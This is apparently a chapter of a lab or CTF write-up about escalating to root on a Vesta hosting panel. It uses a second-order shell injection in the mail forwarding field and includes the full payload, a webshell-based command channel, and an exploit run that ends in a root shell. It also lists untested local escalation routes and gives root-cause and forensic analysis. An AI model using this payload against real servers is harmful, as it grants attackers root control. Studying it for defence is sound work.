# 06 — Privilege escalation: a forwarding address that runs as root

The foothold in chapter 05 executes as `jack`. This chapter does not need a kernel bug, a setuid
binary, or a cron job. It abuses the panel's own privilege: a normal user's input reaches a script
the panel runs through `sudo`.

---

## 6.1 The privileged call

Every mail action is a wrapper around `/usr/local/vesta/bin/v-edit-mail-account`:

```php
define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');
```

The panel builds a shell command string from the request. `v_fwd` — the forwarding address — is
interpolated into it. `v-edit-mail-account` then writes the forwarding into the Dovecot/Exim config,
and it is executed with root rights because the panel's `sudoers` rule allows it.

That is the whole boundary. A customer-supplied string becomes part of a root shell command line.
Quoting is the only control, and quoting is defeated by a single `'`.

## 6.2 Why one injection is not enough

Naively you would send `; id` and read the output. Two problems:

1. **The output does not come back to you.** The panel captures the script's stdout into its own
   HTTP response — which you receive, but only as the panel's formatting, and only for the *first*
   command in the string. Anything appended after it is invisible.
2. **The command must not break the panel's own command line.** If the trailing quote is left
   unbalanced, the shell errors out and the panel returns a failure — and you learn nothing.

So the payload has to survive being embedded, and it has to give us our own input/output channel.
Which is what the webshell from chapter 05 is for.

## 6.3 Payload anatomy

```text
';bash</home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec>/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult;A='
```

Four parts:

| Fragment | Job |
|---|---|
| `';` | close the panel's quoted argument and start a new command |
| `bash<…cmdtoexec>…cmdresult` | run whatever is in `cmdtoexec`, write stdout to `cmdresult` |
| `;` | end that command |
| `A='` | reopen a quote so the panel's remaining command line stays balanced |

It contains **no spaces**. That matters: the value travels as a form field through several layers,
and a space-free payload survives quoting, `IFS` splitting and any naive word-splitting on the way.
`<` and `>` do the argument separation that spaces would normally do.

The result is a file-based command channel:

```text
webshell writes  →  public_html/iamroot/cmdtoexec
injection runs   →  bash cmdtoexec > cmdresult        (as root)
webshell reads   →  public_html/iamroot/cmdresult
```

`public_html` is writable by `jack` and readable through Apache, so both ends are ours. The
*execution* is root's.

## 6.4 Second-order injection

This is not reflected injection. The dangerous value is **stored** first — as a mailbox forwarding
address, in the mail configuration — and evaluated later, by a different process, with different
privileges:

```text
1. POST /api/v1/edit/mail/index.php     →  v_fwd stored     (request as jack)
2. v-edit-mail-account runs under sudo  →  value evaluated  (process as root)
```

Two consequences follow, and both are useful beyond this box:

- **Input filtering at the API layer is the wrong place to look.** The value is legal free text for
  a forwarding address. It is only dangerous where it is *used*.
- **The trigger is repeatable.** Re-saving the mailbox re-runs the script, which is exactly how the
  script's command loop works: write `cmdtoexec`, re-save the mailbox with `v_fwd=foobar` to
  re-trigger, read `cmdresult`.

## 6.5 Running it

```bash
python3 scripts/vesta-rce-exploit.py https://192.168.161.156:8083 jack '3PUKsX98BMupBiCf'
```

```text
[INFO] Attempting login to https://192.168.161.156:8083 as jack
[+] Logged in as jack
[INFO] Checking for existing webshell or creating one
[!] 4wfarbc2dg.poc not found, creating one...
[+] 4wfarbc2dg.poc added
[+] 4wfarbc2dg.poc found, looking up webshell
[!] webshell not found, creating one..
[+] Webshell uploaded
[INFO] Creating mailbox on domain 4wfarbc2dg.poc
[!] Mail domain not found, creating one..
[+] Mail domain created
[+] Mail account created
[INFO] Editing mailbox to test payload
[INFO] Deploying backdoor via mailbox editing
[INFO] [+] Root shell possibly obtained. Enter commands:
# id
uid=0(root) gid=0(root) groups=0(root)
```

Note the honest wording in the script: **“possibly obtained”**. It is a blind injection — the script
cannot know whether the command ran until it reads `cmdresult` back. `id` returning `uid=0` is the
actual proof.

## 6.6 Reading the result

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# pwd
/usr/local/vesta/web/api/v1/edit/mail

# cat /root/proof.txt
d4640a77ca31e0ab126751f98e819888

# cat /home/jack/local.txt
9cfca959e54738e70905a4024d16a44a
```

That `pwd` is the most interesting line in the whole box. **The working directory of the root shell
is `/usr/local/vesta/web/api/v1/edit/mail`** — the cwd of the PHP request handler that invoked
`v-edit-mail-account`. The root command inherited it.

Forensically that is a fingerprint: a root process whose cwd is a web request directory means
panel-level command injection, not a binary exploit. On the defensive side, that is where you look
first.

## 6.7 What actually gave root

Worth being precise, because "Vesta is vulnerable" is not an explanation:

- `sudoers` permits the panel account to run `/usr/local/vesta/bin/v-*` **as root**, without
  argument restrictions. Any argument the panel passes is therefore root-controlled data.
- `v-edit-mail-account` builds a shell command line by string concatenation and does not quote
  `v_fwd` as a single token.
- The API treats `v_fwd` as unvalidated free text, because a forwarding address legitimately is.

Remove any one of those three and the chain breaks.

## 6.8 Routes present but not used

Recorded as hypotheses, not results — none of these were exercised on this box:

| Route | Why it is plausible | Status |
|---|---|---|
| Exim `${run{}}` **from a local shell** | `4.90_1` predates the June-2019 fix unless the Ubuntu revision is `-1ubuntu1.2`; local exploitation needs no `local_part_suffix` | untested — `dpkg -l exim4-daemon-light` after a shell decides it |
| Vesta API-key LPE (#2045) | Any non-empty key in `/usr/local/vesta/data/keys/` allows escalation via `v-generate-api-key` | untested — `ls -la /usr/local/vesta/data/keys/` |
| CVE-2019-0211 (Apache 2.4.29) | Local privesc, reachable from a shared-memory write in an Apache worker | untested — needs execution inside a worker |

The remote Exim path was ruled out earlier: the server answered `550 Restricted characters in
address` for a payload containing `/`, which is Debian's stock ACL, and stock Debian ships without
`local_part_suffix`. With no address extensions, `${run{}}` cannot be reached over SMTP. That is a
*config* conclusion, not a patch-state conclusion — which is why the `dpkg` check is still listed
above.

## 6.9 Why we did not need any of them

The panel route was fast and deterministic once the credential existed: one script, one injection,
root. Every extra branch is time you spend while the box is already owned.

The lesson generalises. On a hosting panel, enumerate the `v-*` surface before you look for binary
exploits — the panel's own privilege model is the vulnerability.
